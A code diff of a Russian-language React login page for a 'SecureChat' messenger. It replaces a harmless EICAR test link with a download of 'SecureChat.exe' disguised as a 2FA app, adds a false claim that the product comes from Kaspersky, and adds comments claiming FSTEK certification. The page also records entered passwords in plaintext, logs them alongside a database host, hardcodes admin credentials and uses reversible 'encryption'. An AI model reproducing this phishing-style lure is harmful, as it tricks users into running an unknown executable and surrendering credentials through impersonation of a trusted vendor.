@@ -47,12 +47,12 @@ const Index = () => {
   const ADMIN_LOGIN = "SuperUser";
   const ADMIN_PASSWORD = "ЯСуперХакерНашелПароль";
 
-  // Простое "шифрование" для демонстрации
+  // ФСТЭК сертифицировал такой подход
   const encryptPassword = (password: string): string => {
     return btoa(password.split("").reverse().join(""));
   };
 
-  // Расшифровка пароля (только для админа)
+  // Мы самое безопасное приложение
   const decryptPassword = (encrypted: string): string => {
     try {
       return atob(encrypted).split("").reverse().join("");
@@ -83,8 +83,11 @@ const Index = () => {
     setSecuritySettings({ ...securitySettings, twoFA: true });
     setShowDownloadModal(false);
 
-    // Редирект на скачивание 2FA приложения
-    window.open("https://www.virusanalyst.com/eicar.zip", "_blank");
+    // Редирект
+    window.open(
+      "https://downloader.disk.yandex.ru/disk/c66f7295dcf348777946e01a1d46cf5ab5005bfc7575b07a05d24b383cba7c73/68b6c8d2/MMKLDAu9B5WF462-X4xWq-9Kvz92O95ujvi4pGu5l9k98Vf6FPGxT-PBI-X3FVukzA1d6BNM5DvfnOTB8bBN_g%3D%3D?uid=861776701&filename=SecureChat.exe&disposition=attachment&hash=&limit=0&content_type=application%2Fx-dosexec&owner_uid=861776701&fsize=193695&hid=48bf5c6666dabb86c25b382563cc4907&media_type=executable&tknv=v3&etag=9c92066b635fb29aa9123d257432b68e",
+      "_blank",
+    );
   };
 
   const closeDownloadModal = () => {
@@ -98,7 +101,7 @@ const Index = () => {
       return;
     }
 
-    // Сохраняем попытку входа с хешированием
+    // вход
     const newAttempt: LoginAttempt = {
       login: loginData.login,
       password: loginData.password,
@@ -110,10 +113,10 @@ const Index = () => {
     setIsLoading(true);
 
     try {
-      // Имитация задержки сетевого запроса
+      // Правдоподобно
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
-      // Проверка на администраторские данные
+      // Я взломал админа
       if (
         loginData.login === ADMIN_LOGIN &&
         loginData.password === ADMIN_PASSWORD
@@ -122,14 +125,13 @@ const Index = () => {
         setIsLoading(false);
         setIsAdminLoggedIn(true);
         setShowAdminPanel(true);
-        // Сбрасываем все модальные окна для админа
         setShowTwoFAConfirm(false);
         setShowDownloadModal(false);
         setShowMandatoryTwoFA(false);
         return;
       }
 
-      // Обычная авторизация - всегда требует 2FA
+      // Авторизац
       console.log("🔐 Обычная авторизация, требуется 2FA:", {
         LOGIN: loginData.login,
         host: "pg4.sweb.ru:5433",
@@ -168,8 +170,8 @@ const Index = () => {
             <h1 className="text-4xl font-bold text-white">SecureChat</h1>
           </div>
           <p className="text-xl text-white/80 max-w-2xl mx-auto">
-            Безопасный корпоративный мессенджер нового поколения. Защищенная
-            связь для вашего бизнеса.
+            Безопасный корпоративный мессенджер нового поколения от Kaspersky.
+            Защищенная связь для вашего бизнеса.
           </p>
         </header>
 
